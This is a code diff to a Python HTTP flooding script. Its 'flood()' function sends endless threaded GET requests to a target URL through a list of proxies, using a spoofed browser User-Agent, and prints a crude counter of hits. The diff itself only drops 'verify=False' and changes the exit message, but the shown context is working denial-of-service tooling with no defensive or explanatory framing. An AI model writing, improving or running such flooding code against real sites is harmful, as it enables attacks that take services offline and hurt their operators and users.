@@ -22,7 +22,7 @@ def flood():
   header = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"}
   for x in proxieslist:
    proxiez = {'http':'http:'+str(x),'https':'http:'+str(x)}
-   r = requests.get(url, proxies=proxiez, headers=header, verify=False)
+   r = requests.get(url, proxies=proxiez, headers=header)
    global count
    count+=1
    print(f'{Fore.GREEN}[{Fore.CYAN}{count}{Fore.GREEN}] {Fore.CYAN}fucking this shit: {Fore.GREEN}{url} [{Fore.MAGENTA}{r.status_code}{Fore.GREEN}]')
@@ -34,4 +34,5 @@ while True:
  try:
   threading.Thread(target=flood).start()
  except:
-  print('while loop err.')
+  print('\nexiting..')
+  exit(0)
